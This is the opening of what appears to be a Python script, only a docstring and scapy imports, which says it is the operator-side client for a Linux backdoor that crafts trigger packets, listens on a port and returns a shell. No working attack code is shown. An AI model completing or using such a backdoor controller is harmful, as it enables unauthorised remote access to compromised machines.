"""
This program is a home side program to use the linux backdoor.
It generates the right packets, listens on the right port and gives you a
shell.
"""

from scapy.all import *
from random import randint